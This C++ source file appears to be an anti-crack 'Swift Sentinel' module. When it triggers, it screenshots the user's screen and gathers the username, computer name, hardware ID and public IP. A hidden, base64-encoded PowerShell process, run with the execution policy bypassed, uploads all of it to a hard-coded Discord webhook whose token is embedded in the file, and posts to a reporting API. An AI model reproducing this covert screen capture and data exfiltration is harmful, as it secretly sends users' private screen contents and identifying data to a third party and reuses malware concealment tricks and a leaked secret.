#include "webhook_report.hpp"
#include "ethera_prot.hpp"
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <regex>
#include <filesystem>
#include <chrono>
#include <iomanip>
#include <thread>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "psapi.lib")

namespace webhook_report {

static const std::string WEBHOOK_URL_STR = "https://discord.com/api/webhooks/1541938361382740009/r0DNyl5tbGxuPmNfg4kcoU5RSGtSuJm5to9Us3Z1hKPY_ot_IQ4ec7g16IAcYEK_oWw8";

static std::string get_current_time_str() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    struct tm timeinfo = {};
    gmtime_s(&timeinfo, &in_time_t);
    ss << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S UTC");
    return ss.str();
}

void write_debug_log(const std::string& msg) {
    std::string line = "[" + get_current_time_str() + "] " + msg + "\n";
    OutputDebugStringA(line.c_str());

    std::ofstream ofs("webhook_debug.txt", std::ios::app);
    if (ofs.is_open()) {
        ofs << line;
        ofs.flush();
    }
}

static std::string get_temp_file_path(const std::string& filename) {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) > 0) {
        return std::string(tempPath) + filename;
    }
    return filename;
}

static bool capture_screen_gdi(const std::string& outPath) {
    write_debug_log("[Screen Capture] Capturing primary monitor via Win32 GDI BitBlt...");
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return false;
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) { ReleaseDC(NULL, hScreenDC); return false; }
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
    if (!hBitmap) { DeleteDC(hMemoryDC); ReleaseDC(NULL, hScreenDC); return false; }
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);

    BITMAPFILEHEADER bmfHeader{};
    BITMAPINFOHEADER bi{};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD dwBmpSize = ((w * bi.biBitCount + 31) / 32) * 4 * h;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    if (!hDIB) {
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return false;
    }
    char* lpbitmap = (char*)GlobalLock(hDIB);
    GetDIBits(hScreenDC, hBitmap, 0, h, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::ofstream file(outPath, std::ios::binary);
    bool saved = false;
    if (file.is_open()) {
        bmfHeader.bfType = 0x4D42; // "BM"
        bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        file.write((char*)&bmfHeader, sizeof(bmfHeader));
        file.write((char*)&bi, sizeof(bi));
        file.write(lpbitmap, dwBmpSize);
        file.close();
        saved = true;
    }

    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    write_debug_log("[Screen Capture] Saved GDI screenshot: " + outPath + " (Success: " + std::string(saved ? "YES" : "NO") + ")");
    return saved;
}

static std::string base64_encode(const uint8_t* data, size_t len) {
    static const char lookup[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    for (size_t i = 0; i < len; i += 3) {
        uint32_t b = (data[i] & 0xFF) << 16;
        if (i + 1 < len) b |= (data[i + 1] & 0xFF) << 8;
        if (i + 2 < len) b |= (data[i + 2] & 0xFF);

        out.push_back(lookup[(b >> 18) & 0x3F]);
        out.push_back(lookup[(b >> 12) & 0x3F]);
        out.push_back((i + 1 < len) ? lookup[(b >> 6) & 0x3F] : '=');
        out.push_back((i + 2 < len) ? lookup[b & 0x3F] : '=');
    }
    return out;
}

static std::string get_env_var(const char* var) {
    char* val = nullptr;
    size_t sz = 0;
    if (_dupenv_s(&val, &sz, var) == 0 && val) {
        std::string res = val;
        free(val);
        return res;
    }
    return "Unknown";
}

static std::wstring to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int sz = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    if (sz <= 0) return L"";
    std::wstring res(sz - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], sz);
    return res;
}

static bool send_webhook_via_powershell_encoded(const std::string& reason, const std::string& timeStr,
                                                 const std::string& username, const std::string& compName,
                                                 const std::string& hwid, const std::string& bmpPath) {
    write_debug_log("[PowerShell Dispatch] Preparing EncodedCommand out-of-process webhook & server IP blacklist report...");

    std::wstring wreason = to_wstring(reason);
    std::wstring wtimeStr = to_wstring(timeStr);
    std::wstring wusername = to_wstring(username);
    std::wstring wcompName = to_wstring(compName);
    std::wstring whwid = to_wstring(hwid);
    std::wstring wurl = to_wstring(WEBHOOK_URL_STR);
    std::wstring wbmpPath = to_wstring(bmpPath);

    auto ps_escape = [](std::wstring s) {
        std::wstring out;
        for (wchar_t c : s) {
            if (c == L'\'') out += L"''";
            else if (c == L'"') out += L"\\\"";
            else out += c;
        }
        return out;
    };

    std::wstring script =
        L"Add-Type -AssemblyName System.Drawing, System.Windows.Forms, System.Net.Http;\r\n"
        L"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\r\n"
        // 1. Report incident to server API to permanently blacklist client IP
        L"try {\r\n"
        L"    $reportStr = 'reason=' + [System.Uri]::EscapeDataString('" + ps_escape(wreason) + L"') + '&hwid=' + [System.Uri]::EscapeDataString('" + ps_escape(whwid) + L"');\r\n"
        L"    Invoke-RestMethod -Uri 'https://api.swiftfly.xyz/report.php' -Method Post -Body $reportStr -ContentType 'application/x-www-form-urlencoded' -ErrorAction SilentlyContinue;\r\n"
        L"} catch {};\r\n"
        // 2. Prepare screenshot attachment
        L"$bmpFile = '" + ps_escape(wbmpPath) + L"';\r\n"
        L"$shotPath = \"$env:TEMP\\swift_shot_$([System.Guid]::NewGuid().ToString('N')).png\";\r\n"
        L"if (Test-Path $bmpFile) {\r\n"
        L"    try {\r\n"
        L"        $img = [System.Drawing.Image]::FromFile($bmpFile);\r\n"
        L"        $img.Save($shotPath, [System.Drawing.Imaging.ImageFormat]::Png);\r\n"
        L"        $img.Dispose();\r\n"
        L"        Remove-Item $bmpFile -Force -ErrorAction SilentlyContinue;\r\n"
        L"    } catch {};\r\n"
        L"}\r\n"
        L"if (-not (Test-Path $shotPath)) {\r\n"
        L"    try {\r\n"
        L"        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;\r\n"
        L"        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;\r\n"
        L"        $graphic = [System.Drawing.Graphics]::FromImage($bitmap);\r\n"
        L"        $graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size);\r\n"
        L"        $bitmap.Save($shotPath, [System.Drawing.Imaging.ImageFormat]::Png);\r\n"
        L"        $graphic.Dispose();\r\n"
        L"        $bitmap.Dispose();\r\n"
        L"    } catch {};\r\n"
        L"}\r\n"
        L"$hasShot = Test-Path $shotPath;\r\n"
        L"$ip = 'Unknown';\r\n"
        L"try { $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 3 -ErrorAction SilentlyContinue) } catch {};\r\n"
        L"if (-not $ip) { $ip = 'Unknown' };\r\n"
        L"if ($hasShot) {\r\n"
        L"    $json = @{\r\n"
        L"        embeds = @(\r\n"
        L"            @{\r\n"
        L"                title = 'CRACKING ATTEMPT DETECTED';\r\n"
        L"                color = 16711680;\r\n"
        L"                image = @{ url = 'attachment://screenshot.png' };\r\n"
        L"                fields = @(\r\n"
        L"                    @{ name = 'IP Address'; value = \"`$($ip)\"; inline = $true };\r\n"
        L"                    @{ name = 'Reason'; value = '" + ps_escape(wreason) + L"'; inline = $false };\r\n"
        L"                    @{ name = 'Time'; value = '`" + ps_escape(wtimeStr) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'Username'; value = '`" + ps_escape(wusername) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'Computer'; value = '`" + ps_escape(wcompName) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'HWID'; value = '`" + ps_escape(whwid) + L"`'; inline = $true }\r\n"
        L"                );\r\n"
        L"                footer = @{ text = 'Swift Sentinel' }\r\n"
        L"            }\r\n"
        L"        )\r\n"
        L"    } | ConvertTo-Json -Depth 5;\r\n"
        L"    try {\r\n"
        L"        $client = New-Object System.Net.Http.HttpClient;\r\n"
        L"        $form = New-Object System.Net.Http.MultipartFormDataContent;\r\n"
        L"        $jsonPart = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, 'application/json');\r\n"
        L"        $form.Add($jsonPart, 'payload_json');\r\n"
        L"        $fs = [System.IO.File]::OpenRead($shotPath);\r\n"
        L"        $filePart = New-Object System.Net.Http.StreamContent($fs);\r\n"
        L"        $filePart.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png');\r\n"
        L"        $form.Add($filePart, 'files[0]', 'screenshot.png');\r\n"
        L"        $resp = $client.PostAsync('" + wurl + L"', $form).Result;\r\n"
        L"        $fs.Close();\r\n"
        L"        $fs.Dispose();\r\n"
        L"        $client.Dispose();\r\n"
        L"    } catch {};\r\n"
        L"    Remove-Item $shotPath -Force -ErrorAction SilentlyContinue;\r\n"
        L"} else {\r\n"
        L"    $json = @{\r\n"
        L"        embeds = @(\r\n"
        L"            @{\r\n"
        L"                title = 'CRACKING ATTEMPT DETECTED';\r\n"
        L"                color = 16711680;\r\n"
        L"                fields = @(\r\n"
        L"                    @{ name = 'IP Address'; value = \"`$($ip)\"; inline = $true };\r\n"
        L"                    @{ name = 'Reason'; value = '" + ps_escape(wreason) + L"'; inline = $false };\r\n"
        L"                    @{ name = 'Time'; value = '`" + ps_escape(wtimeStr) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'Username'; value = '`" + ps_escape(wusername) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'Computer'; value = '`" + ps_escape(wcompName) + L"`'; inline = $true };\r\n"
        L"                    @{ name = 'HWID'; value = '`" + ps_escape(whwid) + L"`'; inline = $true }\r\n"
        L"                );\r\n"
        L"                footer = @{ text = 'Swift Sentinel' }\r\n"
        L"            }\r\n"
        L"        )\r\n"
        L"    } | ConvertTo-Json -Depth 5;\r\n"
        L"    try {\r\n"
        L"        $client = New-Object System.Net.Http.HttpClient;\r\n"
        L"        $jsonPart = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, 'application/json');\r\n"
        L"        $resp = $client.PostAsync('" + wurl + L"', $jsonPart).Result;\r\n"
        L"        $client.Dispose();\r\n"
        L"    } catch {};\r\n"
        L"}\r\n";

    const uint8_t* rawData = reinterpret_cast<const uint8_t*>(script.data());
    size_t rawSize = script.size() * sizeof(wchar_t);
    std::string base64Script = base64_encode(rawData, rawSize);

    std::string cmdLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + base64Script;

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    std::vector<char> cmdBuf(cmdLine.begin(), cmdLine.end());
    cmdBuf.push_back('\0');

    if (CreateProcessA(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        write_debug_log("[PowerShell Dispatch] Process spawned successfully (PID: " + std::to_string(pi.dwProcessId) + ")");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    } else {
        DWORD err = GetLastError();
        write_debug_log("[PowerShell Dispatch] Failed to spawn process, error code: " + std::to_string(err));
        return false;
    }
}

void report_incident_and_die(const std::string& reason) {
    static bool reported = false;
    if (reported) {
        ethera_prot::handle_attack();
        return;
    }
    reported = true;

    write_debug_log("==========================================");
    write_debug_log("[INCIDENT TRIGGERED] " + reason);

    std::string timeStr = get_current_time_str();
    std::string username = get_env_var("USERNAME");
    std::string compName = get_env_var("COMPUTERNAME");
    
    std::string hwid = "Unknown";
    DWORD serial = 0;
    if (GetVolumeInformationW(L"C:\\", nullptr, 0, &serial, nullptr, nullptr, nullptr, 0)) {
        char vol[16]; 
        snprintf(vol, sizeof(vol), "%08X", serial);
        hwid = vol;
    }

    write_debug_log("[System Info] User: " + username + " | Comp: " + compName + " | HWID: " + hwid);

    // 1. Capture screen using Win32 GDI BitBlt
    std::string bmpPath = get_temp_file_path("swift_shot.bmp");
    capture_screen_gdi(bmpPath);

    // 2. Dispatch PowerShell EncodedCommand worker with HttpClient multipart upload and server IP blacklist report
    write_debug_log("[Dispatching Webhook] Spawning out-of-process PowerShell worker (Discord Webhook + Server IP Blacklist)...");
    bool psDispatched = send_webhook_via_powershell_encoded(reason, timeStr, username, compName, hwid, bmpPath);

    write_debug_log("[Result] PowerShell Webhook & IP Blacklist Dispatched: " + std::string(psDispatched ? "YES" : "NO"));
    write_debug_log("==========================================");

    // Wait 4 seconds before terminating process so PowerShell finishes uploading
    Sleep(4000);

    ethera_prot::handle_attack();
}

} // namespace webhook_report